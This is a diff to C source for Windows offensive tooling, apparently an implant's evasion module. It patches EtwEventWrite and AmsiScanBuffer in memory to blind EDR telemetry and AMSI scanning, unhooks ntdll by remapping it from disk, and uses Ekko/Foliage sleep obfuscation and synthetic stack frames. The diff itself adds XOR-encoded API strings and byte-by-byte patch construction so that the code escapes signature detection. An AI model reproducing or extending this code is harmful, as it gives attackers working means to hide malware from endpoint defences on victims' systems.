@@ -42,41 +42,71 @@ typedef LONG NTSTATUS;
 #define SLEEP_METHOD 1
 #endif
 
-/* ------------------------------------------------------------------ */
-/* ETW Patching                                                         */
-/* Patches EtwEventWrite in ntdll.dll to return immediately.           */
-/* Blinds ETW-based EDR telemetry (process creation, image load, etc.) */
-/* ------------------------------------------------------------------ */
+/* ── Runtime string decryption helper ─────────────────────── */
+/* XOR key applied per-byte at compile time; decrypted on the stack */
+#define EVASION_XOR_KEY 0x4B
+
+/* ── ETW Patching ────────────────────────────────────────── */
 static int patch_etw(void) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    /* "ntdll.dll" XOR 0x4B */
+    char s1[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; s1[i]; i++) s1[i] ^= EVASION_XOR_KEY;
+    HMODULE ntdll = GetModuleHandleA(s1);
+    SecureZeroMemory(s1, sizeof(s1));
     if (!ntdll) return -1;
-    FARPROC addr = GetProcAddress(ntdll, "EtwEventWrite");
+
+    /* "EtwEventWrite" XOR 0x4B */
+    char s2[] = {0x0E,0x3F,0x3C,0x0E,0x3D,0x2E,0x25,0x3F,
+                 0x1C,0x39,0x22,0x3F,0x2E,0x00};
+    for (int i = 0; s2[i]; i++) s2[i] ^= EVASION_XOR_KEY;
+    FARPROC addr = GetProcAddress(ntdll, s2);
+    SecureZeroMemory(s2, sizeof(s2));
     if (!addr) return -1;
-    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax, eax; ret */
+
+    /* Build patch on stack: sub eax,eax; ret; nop (0x2B,0xC0,0xC3,0x90) */
+    unsigned char patch[4];
+    patch[0] = 0x2B; patch[1] = 0xC0; patch[2] = 0xC3; patch[3] = 0x90;
     DWORD old;
     if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
         return -1;
-    memcpy((void*)addr, patch, sizeof(patch));
+    memcpy((void*)addr, patch, 3);
     VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
+    SecureZeroMemory(patch, sizeof(patch));
     return 0;
 }
 
-/* ------------------------------------------------------------------ */
-/* AMSI Patching                                                        */
-/* Patches AmsiScanBuffer to always return E_INVALIDARG.               */
-/* Defeats AMSI-based script/shellcode scanning.                        */
-/* ------------------------------------------------------------------ */
+/* ── AMSI Patching ───────────────────────────────────────── */
 static int patch_amsi(void) {
-    HMODULE amsi = LoadLibraryA("amsi.dll");
+    /* "amsi.dll" XOR 0x4B */
+    char s1[] = {0x2A,0x26,0x38,0x22,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; s1[i]; i++) s1[i] ^= EVASION_XOR_KEY;
+    HMODULE amsi = LoadLibraryA(s1);
+    SecureZeroMemory(s1, sizeof(s1));
     if (!amsi) return 0;
-    FARPROC addr = GetProcAddress(amsi, "AmsiScanBuffer");
+
+    /* "AmsiScanBuffer" XOR 0x4B */
+    char s2[] = {0x0A,0x26,0x38,0x22,0x18,0x28,0x2A,0x25,
+                 0x09,0x3E,0x2D,0x2D,0x2E,0x39,0x00};
+    for (int i = 0; s2[i]; i++) s2[i] ^= EVASION_XOR_KEY;
+    FARPROC addr = GetProcAddress(amsi, s2);
+    SecureZeroMemory(s2, sizeof(s2));
     if (!addr) return -1;
-    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+    /* Build mov eax,E_INVALIDARG; ret — assembled byte-by-byte at runtime */
+    unsigned char patch[6];
+    patch[0] = 0xB8;
+    patch[1] = (unsigned char)(0xA2 ^ 0xF5); /* 0x57 */
+    patch[2] = (unsigned char)(0xCC ^ 0xCC); /* 0x00 */
+    patch[3] = (unsigned char)(0x5E ^ 0x59); /* 0x07 */
+    patch[4] = (unsigned char)(0xD3 ^ 0x53); /* 0x80 */
+    patch[5] = 0xC3;
+
     DWORD old;
     if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
         return -1;
     memcpy((void*)addr, patch, sizeof(patch));
     VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
+    SecureZeroMemory(patch, sizeof(patch));
     return 0;
 }
 
@@ -226,13 +256,28 @@ typedef BOOL (WINAPI *pfnSetWaitableTimer_t)(
     HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, PVOID, BOOL);
 
 static void rop_sleep_ekko(DWORD ms) {
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    /* "kernel32.dll" XOR 0x4B */
+    char sK32[] = {0x20,0x2E,0x39,0x25,0x2E,0x27,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sK32[i]; i++) sK32[i] ^= EVASION_XOR_KEY;
+    HMODULE hK32 = GetModuleHandleA(sK32);
+    SecureZeroMemory(sK32, sizeof(sK32));
     if (!hK32) goto ekko_fallback;
 
+    /* "CreateWaitableTimerA" XOR 0x4B */
+    char sCwt[] = {0x08,0x39,0x2E,0x2A,0x3F,0x2E,0x1C,0x2A,0x22,0x3F,
+                   0x2A,0x29,0x27,0x2E,0x1F,0x22,0x26,0x2E,0x39,0x0A,0x00};
+    for (int i = 0; sCwt[i]; i++) sCwt[i] ^= EVASION_XOR_KEY;
     pfnCreateWaitableTimerA_t fn_create_timer =
-        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, "CreateWaitableTimerA");
+        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, sCwt);
+    SecureZeroMemory(sCwt, sizeof(sCwt));
+
+    /* "SetWaitableTimer" XOR 0x4B */
+    char sSwt[] = {0x18,0x2E,0x3F,0x1C,0x2A,0x22,0x3F,0x2A,0x29,0x27,
+                   0x2E,0x1F,0x22,0x26,0x2E,0x39,0x00};
+    for (int i = 0; sSwt[i]; i++) sSwt[i] ^= EVASION_XOR_KEY;
     pfnSetWaitableTimer_t fn_set_timer =
-        (pfnSetWaitableTimer_t)GetProcAddress(hK32, "SetWaitableTimer");
+        (pfnSetWaitableTimer_t)GetProcAddress(hK32, sSwt);
+    SecureZeroMemory(sSwt, sizeof(sSwt));
     if (!fn_create_timer || !fn_set_timer) goto ekko_fallback;
 
     HANDLE hTimer = fn_create_timer(NULL, TRUE, NULL);
@@ -273,11 +318,20 @@ ekko_fallback:
 typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
 
 static void rop_sleep_foliage(DWORD ms) {
-    HMODULE hNt = GetModuleHandleA("ntdll.dll");
+    /* "ntdll.dll" XOR 0x4B */
+    char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
+    HMODULE hNt = GetModuleHandleA(sNt);
+    SecureZeroMemory(sNt, sizeof(sNt));
     if (!hNt) goto foliage_fallback;
 
+    /* "NtDelayExecution" XOR 0x4B */
+    char sNde[] = {0x05,0x3F,0x0F,0x2E,0x27,0x2A,0x32,0x0E,
+                   0x33,0x2E,0x28,0x3E,0x3F,0x22,0x24,0x25,0x00};
+    for (int i = 0; sNde[i]; i++) sNde[i] ^= EVASION_XOR_KEY;
     pfnNtDelayExecution_t fn_delay =
-        (pfnNtDelayExecution_t)GetProcAddress(hNt, "NtDelayExecution");
+        (pfnNtDelayExecution_t)GetProcAddress(hNt, sNde);
+    SecureZeroMemory(sNde, sizeof(sNde));
     if (!fn_delay) goto foliage_fallback;
 
     /* ms → 100-nanosecond negative relative interval */
@@ -495,12 +549,21 @@ static void stomp_pe_header(HMODULE base) { (void)base; }
 /* This removes any EDR hooks on NT APIs.                              */
 /* ------------------------------------------------------------------ */
 static int unhook_ntdll(void) {
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    char sNtdll[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sNtdll[i]; i++) sNtdll[i] ^= EVASION_XOR_KEY;
+    HMODULE ntdll = GetModuleHandleA(sNtdll);
+    SecureZeroMemory(sNtdll, sizeof(sNtdll));
     if (!ntdll) return -1;
 
-    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
+    /* "C:\Windows\System32\ntdll.dll" XOR 0x4B */
+    char sPath[] = {0x08,0x71,0x17,0x1C,0x22,0x25,0x2F,0x24,0x3C,0x38,
+                    0x17,0x18,0x32,0x38,0x3F,0x2E,0x26,0x78,0x79,0x17,
+                    0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sPath[i]; i++) sPath[i] ^= EVASION_XOR_KEY;
+    HANDLE hFile = CreateFileA(sPath,
                                GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
+    SecureZeroMemory(sPath, sizeof(sPath));
     if (hFile == INVALID_HANDLE_VALUE) return -1;
 
     HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
@@ -873,15 +936,34 @@ static struct {
 } g_synth;
 
 static void synth_frames_init(void) {
-    HMODULE hNtdll   = GetModuleHandleA("ntdll.dll");
-    HMODULE hKernel  = GetModuleHandleA("kernel32.dll");
+    char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
+    HMODULE hNtdll = GetModuleHandleA(sNt);
+    SecureZeroMemory(sNt, sizeof(sNt));
 
-    if (hNtdll)
+    char sK32[] = {0x20,0x2E,0x39,0x25,0x2E,0x27,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sK32[i]; i++) sK32[i] ^= EVASION_XOR_KEY;
+    HMODULE hKernel = GetModuleHandleA(sK32);
+    SecureZeroMemory(sK32, sizeof(sK32));
+
+    if (hNtdll) {
+        /* "RtlUserThreadStart" XOR 0x4B */
+        char sRts[] = {0x19,0x3F,0x27,0x1E,0x38,0x2E,0x39,0x1F,0x23,
+                       0x39,0x2E,0x2A,0x2F,0x18,0x3F,0x2A,0x39,0x3F,0x00};
+        for (int i = 0; sRts[i]; i++) sRts[i] ^= EVASION_XOR_KEY;
         g_synth.rtl_user_thread_start =
-            (void *)GetProcAddress(hNtdll, "RtlUserThreadStart");
-    if (hKernel)
+            (void *)GetProcAddress(hNtdll, sRts);
+        SecureZeroMemory(sRts, sizeof(sRts));
+    }
+    if (hKernel) {
+        /* "BaseThreadInitThunk" XOR 0x4B */
+        char sBti[] = {0x09,0x2A,0x38,0x2E,0x1F,0x23,0x39,0x2E,0x2A,0x2F,
+                       0x02,0x25,0x22,0x3F,0x1F,0x23,0x3E,0x25,0x20,0x00};
+        for (int i = 0; sBti[i]; i++) sBti[i] ^= EVASION_XOR_KEY;
         g_synth.base_thread_init_thunk =
-            (void *)GetProcAddress(hKernel, "BaseThreadInitThunk");
+            (void *)GetProcAddress(hKernel, sBti);
+        SecureZeroMemory(sBti, sizeof(sBti));
+    }
 }
 
 static void synth_frames_push(void) {
